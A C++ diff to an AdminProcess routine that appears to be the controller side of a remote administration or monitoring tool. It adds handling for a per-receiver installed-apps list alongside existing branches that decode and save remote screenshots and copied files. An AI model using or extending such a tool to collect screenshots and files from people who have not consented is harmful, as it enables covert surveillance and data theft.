@@ -237,14 +237,21 @@ void MyCurl::AdminProcess(const vector<string> IDs, const int query) {
 			Preprocess();
 			if (IDSet.find(receiverID) != IDSet.end()) {
 				if (stoi(this->query) == query) {
-					if (query == 22) { //More query
+					if (query == 11) {
+						subContent = base64_decode(subContent);
+						fstream file(ComPath + "List/ListApp" + receiverID, ios::out | ios::binary);
+						file << subContent;
+						file.close();
+						cout << "Saved ListApp of " + receiverID + " at " + ComPath + "List/ListApp" + receiverID << endl;
+					}
+					if (query == 22) { //More query, Capture screenshot
 						subContent = base64_decode(subContent);
 						fstream file("_Data/screenshot" + receiverID + ".jpg", ios::out | ios::binary);
 						file << subContent;
 						file.close();
 						cout << "Saved screenshot of " + receiverID << endl;
 					}
-					else if (query == 20) { //result is fileName
+					else if (query == 20) { //result is fileName, Copy file
 						subContent = base64_decode(subContent);
 						string fileName = GetFileName();
 						fstream file("_Data/Copy/" + fileName + receiverID, ios::out | ios::binary);
